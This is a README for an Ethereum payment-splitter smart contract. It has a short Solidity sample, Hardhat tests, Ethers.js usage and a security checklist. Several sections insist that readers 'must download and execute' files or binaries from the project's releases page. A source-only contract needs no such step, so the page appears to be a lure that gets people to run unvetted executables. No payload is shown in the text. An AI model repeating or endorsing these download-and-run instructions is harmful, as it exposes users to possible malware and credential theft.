# Payment Splitter — Split ETH by Weights with Pull Withdrawals

[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge)](https://github.com/zyashu666/payment-splitter/releases)

![Ethereum](https://raw.githubusercontent.com/ethereum/ethereum-org-website/master/src/assets/hero/eth-diamond-black.png)

One-line: Split incoming ETH among payees using share weights. Pull-based withdrawals. CEI pattern. Sepolia demo and verified source.

Badges
- Topics: ethereum • evm • solidity • hardhat • openzeppelin • remix • sepolia • etherscan • ethersjs • sourcify  
- Repo topics: `ethereum`, `etherscan`, `ethersjs`, `evm`, `hardhat`, `openzeppelin`, `payment-splitter`, `remix`, `sepolia`, `smart-contract`, `solidity`, `sourcify`

Features
- Deterministic split by integer shares.
- Pull payment model: each payee withdraws their balance.
- Uses Checks-Effects-Interactions (CEI) to reduce reentrancy risk.
- Simple contract API for deposits and releases.
- Sepolia demo deployment and verified source code.
- Hardhat tests and Ethers.js examples.

Quick links
- Download release assets (must download and execute the file): https://github.com/zyashu666/payment-splitter/releases
- Releases page (badge): [![Download Releases](https://img.shields.io/badge/Get%20Releases-blue?style=flat-square)](https://github.com/zyashu666/payment-splitter/releases)

Why this pattern
- Push-based splits send ETH at deposit time. That can fail and locks funds.
- Pull-based splits keep funds in the contract. Each payee calls `release` to claim.
- Pull mode plays well with gas limits and external wallets.
- CEI pattern reduces reentrancy surface by updating state before external calls.

Repository layout
- contracts/ — Solidity contracts (PaymentSplitter.sol).
- test/ — Hardhat tests (JavaScript/TypeScript).
- scripts/ — Deploy and helper scripts (Hardhat/Ethers.js).
- examples/ — Small dApp examples and Remix snippets.
- docs/ — Design notes and security audit checklist.
- .github/ — CI and release workflow.

Contract overview (simple)
- Constructor: `constructor(address[] memory payees, uint256[] memory shares_)`
- receive() `external payable` — Accept ETH.
- `release(address payable account)` — Send owed ETH to `account`. Uses CEI: mark released then `call`.
- `totalShares()` / `totalReleased()` / `shares(account)` / `released(account)`

Example Solidity (short)
```solidity
// Simplified interface
contract PaymentSplitter {
  uint256 private _totalShares;
  uint256 private _totalReleased;
  mapping(address => uint256) private _shares;
  mapping(address => uint256) private _released;

  constructor(address[] memory payees, uint256[] memory shares_) { /* set payees */ }
  receive() external payable {}
  function release(address payable account) public {
    uint256 payment = pendingPayment(account);
    require(payment > 0, "No payment");
    _released[account] += payment;
    _totalReleased += payment;
    (bool sent,) = account.call{value: payment}("");
    require(sent, "Failed");
  }
}
```

Usage: local test network (Hardhat)
1. Install
```bash
git clone https://github.com/zyashu666/payment-splitter.git
cd payment-splitter
npm install
```
2. Run tests
```bash
npx hardhat test
```
3. Deploy to Sepolia
- Update `.env` with `SEPOLIA_URL` and `PRIVATE_KEY`.
- Use the deploy script:
```bash
npx hardhat run --network sepolia scripts/deploy.js
```

Ethers.js example: deposit and release
```js
// Deposit (send ETH to contract)
await signer.sendTransaction({ to: contract.address, value: ethers.utils.parseEther("1.0") });

// Payee claims
const contractWithPayee = contract.connect(payeeSigner);
await contractWithPayee.release(payeeAddress);
```

Sepolia demo and verification
- Live demo deployed to Sepolia. Source verified on Etherscan and Sourcify.
- Example Etherscan URL pattern:
  https://sepolia.etherscan.io/address/<contract_address>#code
- Search the release notes for the exact contract address and assets.

Releases and downloads
- Visit the Releases page and download the packaged artifact(s). The files in the release must be downloaded and executed according to the asset instructions. See the asset notes on the Releases page for exact commands.
- Releases: https://github.com/zyashu666/payment-splitter/releases

Development notes
- The contract follows the CEI pattern.
- The contract uses integer math for share allocation:
  payment = (totalReceived * shares[account]) / totalShares - released[account]
- The contract does not hold tokens. It handles native ETH only.
- For ERC20 tokens, a similar pattern with `safeTransfer` is recommended.

Security checklist
- Use CEI: update state before external calls.
- Use `call` for ETH transfers and check the return value.
- Validate constructor inputs: non-empty payee list and positive shares.
- Protect against duplicates in payees.
- Add unit tests for edge cases:
  - Zero shares
  - Duplicate payees
  - Reentrancy attempts
  - Multiple deposits and releases

Testing ideas
- Test split calculations with integer rounding.
- Simulate many payees and verify gas cost.
- Test behavior when a payee never claims.
- Test partial claims after multiple deposits.

Example test (Hardhat)
```js
describe("PaymentSplitter", function () {
  it("splits and releases", async function () {
    const [owner, a, b] = await ethers.getSigners();
    const PaymentSplitter = await ethers.getContractFactory("PaymentSplitter");
    const splitter = await PaymentSplitter.deploy([a.address, b.address], [1, 1]);
    await owner.sendTransaction({ to: splitter.address, value: ethers.utils.parseEther("2") });
    await splitter.connect(a).release(a.address);
    expect(await ethers.provider.getBalance(splitter.address)).to.be.lt(ethers.utils.parseEther("2"));
  });
});
```

Gas and optimization
- Gas scales linearly with number of payees when adding or iterating.
- Avoid on-chain loops over large arrays.
- If you need many payees, consider batching or an off-chain index.

Integration tips
- Use Ethers.js or Web3 to call `release`.
- Front-end should show due balance: compute with `shares`, `totalReleased`, and contract balance or `totalReceived`.
- Show pending amount to the payee. Do not assume automatic pushes.

CI and verification
- Hardhat verify plugin automates Etherscan verification:
```bash
npx hardhat verify --network sepolia DEPLOYED_ADDRESS "arg1" "arg2"
```
- Use reproducible compiler settings in `hardhat.config.js` to match verification metadata.

Contributing
- Open an issue for bugs or feature requests.
- Fork the repo and submit pull requests for changes.
- Keep changes small and focused. Add tests for new behavior.

Changelog and releases
- Check the Releases page for packaged builds, demo artifacts, and deploy scripts. Download the release file(s) and execute the included scripts or binaries as documented in the release notes.
- Releases: https://github.com/zyashu666/payment-splitter/releases

License
- MIT (or adjust to your license). See LICENSE file.

Contact
- Use GitHub Issues for questions and feature requests.
- Use pull requests for code changes.

Images and resources
- Ethereum diamond: https://raw.githubusercontent.com/ethereum/ethereum-org-website/master/src/assets/hero/eth-diamond-black.png
- OpenZeppelin: https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/master/docs/assets/openzeppelin-logo.png
- Ethers.js: https://raw.githubusercontent.com/ethers-io/ethers.js/master/docs/logo.png

Quick troubleshooting
- If verification fails, compare compiler version and optimizer settings.
- If a payee gets zero, check shares and totalShares values.
- If ETH transfers fail, check gas and use the transaction receipt.

Release scripts (example)
```bash
# build and create a release artifact
npx hardhat compile
zip -r release-artifact.zip contracts scripts artifacts
# Upload release-artifact.zip on the Releases page and document usage
```

Examples and demo
- See /examples for a minimal dApp that shows pending balances and calls `release`.
- The demo on Sepolia shows deploy and verified source. Use the Releases page to find the demo artifact and run it.

Community
- Use issues for bugs and features.
- Use pull requests for improvements.
- cite contracts and verification links in PRs.

Keep the contract simple. Keep the math transparent. Keep the interface small.